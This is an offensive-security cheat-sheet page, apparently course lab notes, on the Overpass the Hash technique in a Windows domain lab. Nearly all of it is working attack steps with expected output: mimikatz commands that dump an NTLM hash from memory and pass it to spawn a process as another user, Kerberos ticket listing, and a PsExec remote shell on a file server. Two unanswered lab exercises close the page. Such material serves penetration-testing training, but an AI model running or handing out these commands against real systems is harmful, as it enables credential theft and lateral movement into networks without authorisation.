# Overpass the Hash

Enabling extra options
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Overpass-the-Hash-1.png)

Dumping password hash for 'jen'
>``` shell
>mimikatz # privilege::debug
>
># ========== Expected Result ==========
>Privilege '20' OK
># =====================================
>
>mimikatz # sekurlsa::logonpasswords
>
># ========== Expected Result ==========
>...
>Authentication Id : 0 ; 1142030 (00000000:00116d0e)
>Session           : Interactive from 0
>User Name         : jen
>Domain            : CORP
>Logon Server      : DC1
>Logon Time        : 2/27/2023 7:43:20 AM
>SID               : S-1-5-21-1987370270-658905905-1781884369-1124
>        msv :
>         [00000003] Primary
>         * Username : jen
>         * Domain   : CORP
>         * NTLM     : 369def79d8372408bf6e93364cc93075
>         * SHA1     : faf35992ad0df4fc418af543e5f4cb08210830d4
>         * DPAPI    : ed6686fedb60840cd49b5286a7c08fa4
>        tspkg :
>        wdigest :
>         * Username : jen
>         * Domain   : CORP
>         * Password : (null)
>        kerberos :
>         * Username : jen
>         * Domain   : CORP.COM
>         * Password : (null)
>        ssp :
>        credman :
>...
># =====================================
>```

Creating a process with a different user's NTLM password hash
>``` shell
>mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell 
>
># ========== Expected Result ==========
>user    : jen
>domain  : corp.com
>program : powershell
>impers. : no
>NTLM    : 369def79d8372408bf6e93364cc93075
>  |  PID  8716
>  |  TID  8348
>  |  LSA Process is now R/W
>  |  LUID 0 ; 16534348 (00000000:00fc4b4c)
>  \_ msv1_0   - data copy @ 000001F3D5C69330 : OK !
>  \_ kerberos - data copy @ 000001F3D5D366C8
>   \_ des_cbc_md4       -> null
>   \_ des_cbc_md4       OK
>   \_ des_cbc_md4       OK
>   \_ des_cbc_md4       OK
>   \_ des_cbc_md4       OK
>   \_ des_cbc_md4       OK
>   \_ des_cbc_md4       OK
>   \_ *Password replace @ 000001F3D5C63B68 (32) -> null
># =====================================
>```

Listing Kerberos tickets
>``` shell
>PS C:\Windows\system32> klist
>
># ========== Expected Result ==========
>Current LogonId is 0:0x1583ae
>
>Cached Tickets: (0)
># =====================================
>```

Mapping a network share on a remote server
>``` shell
>PS C:\Windows\system32> net use \\files04
>
># ========== Expected Result ==========
>The command completed successfully.
># =====================================
>```

Listing Kerberos tickets
>``` shell
>PS C:\Windows\system32> klist
>
># ========== Expected Result ==========
>Current LogonId is 0:0x17239e
>
>Cached Tickets: (2)
>
>#0>     Client: jen @ CORP.COM
>        Server: krbtgt/CORP.COM @ CORP.COM
>        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
>        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
>        Start Time: 2/27/2023 5:27:28 (local)
>        End Time:   2/27/2023 15:27:28 (local)
>        Renew Time: 3/6/2023 5:27:28 (local)
>        Session Key Type: RSADSI RC4-HMAC(NT)
>        Cache Flags: 0x1 -> PRIMARY
>        Kdc Called: DC1.corp.com
>
>#1>     Client: jen @ CORP.COM
>        Server: cifs/files04 @ CORP.COM
>        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
>        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
>        Start Time: 2/27/2023 5:27:28 (local)
>        End Time:   2/27/2023 15:27:28 (local)
>        Renew Time: 3/6/2023 5:27:28 (local)
>        Session Key Type: AES-256-CTS-HMAC-SHA1-96
>        Cache Flags: 0
>        Kdc Called: DC1.corp.com
># =====================================
>```

Opening remote connection using Kerberos
>``` shell
>PS C:\Windows\system32> cd C:\tools\SysinternalsSuite\
>
>PS C:\tools\SysinternalsSuite> .\PsExec.exe \\files04 cmd
>
># ========== Expected Result ==========
>PsExec v2.4 - Execute processes remotely
>Copyright (C) 2001-2022 Mark Russinovich
>Sysinternals - www.sysinternals.com
>
>Microsoft Windows [Version 10.0.20348.169]
>(c) Microsoft Corporation. All rights reserved.
>
>C:\Windows\system32>
># =====================================
>
>C:\Windows\system32>whoami
>
># ========== Expected Result ==========
>corp\jen
># =====================================
>
>C:\Windows\system32>hostname
>
># ========== Expected Result ==========
>FILES04
># =====================================
>```

Lab 1 - Start VM Group 1 and repeat the steps discussed in this section. Which command is used to inspect the current TGT available for the running user?
>``` shell
>
>```
>

Lab 2 - Start VM Group 2 and try to execute the overpass the hash technique to move laterally to web04 to get the flag located on the Administrator's desktop. To do so, connect to CLIENT76 via RDP as the offsec user and use the NTLM hash obtained in a previous Module.
>``` shell
>
>```
>
